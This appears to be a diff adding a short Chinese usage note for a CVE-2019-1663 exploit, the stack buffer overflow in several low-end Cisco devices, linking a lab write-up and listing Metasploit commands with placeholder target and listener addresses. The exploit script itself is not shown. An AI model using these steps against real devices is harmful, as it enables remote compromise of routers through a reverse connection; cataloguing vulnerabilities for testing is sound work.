@@ -1,0 +1,9 @@
+验证方式：验证文章
+文章链接：http://lab.xinruisec.com/2019/09/20/CVE-2019-1663-Cisco%E7%9A%84%E5%A4%9A%E4%B8%AA%E4%BD%8E%E7%AB%AF%E8%AE%BE%E5%A4%87%E7%9A%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/
+
+将脚本放入metasploit渗透框架中，
+set RHOST xx.xx.xx.xx
+set RPORT xx
+set LHOST xx.xx.xx.xx
+set LPORT xx
+exploit
